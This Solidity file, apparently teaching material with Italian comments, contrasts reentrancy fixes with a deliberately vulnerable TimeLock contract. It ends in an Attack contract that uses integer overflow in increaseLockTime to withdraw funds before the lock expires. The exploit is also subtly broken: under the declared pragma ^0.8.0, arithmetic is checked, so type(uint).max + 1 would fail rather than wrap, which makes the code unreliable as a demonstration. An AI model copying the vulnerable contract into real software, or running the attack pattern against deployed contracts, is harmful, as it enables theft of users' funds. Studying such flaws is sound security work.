pragma solidity ^0.8.0;

contract VictimFixed {
    mapping(address => uint) public shares;
    event valueWithdrawn(address indexed _from, uint _amount);

    function deposit() public payable {
        shares[msg.sender] += msg.value;
    }

    // Checks-Effects-Interactions: prima i controlli, poi l'aggiornamento dello stato, per ultima la chiamata esterna
    function withdraw() public {
        uint share = shares[msg.sender];
        require(share > 0, "Empty balance");              // Checks
        shares[msg.sender] = 0;                            // Effects
        emit valueWithdrawn(msg.sender, share);
        (bool success, ) = payable(msg.sender).call{value: share}(""); // Interactions
        require(success, "Transfer failed");               // se fallisce, il revert ripristina anche shares
    }
}

contract VictimGuard {
    mapping(address => uint) public shares;
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable { shares[msg.sender] += msg.value; }

    // stessa logica vulnerabile di Victim, ma protetta da un lock
    function withdraw() public nonReentrant {
        require(shares[msg.sender] > 0, "Empty balance");
        (bool success,) = msg.sender.call{value: shares[msg.sender]}("");
        if (success)
            shares[msg.sender] = 0;
    }
}

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}

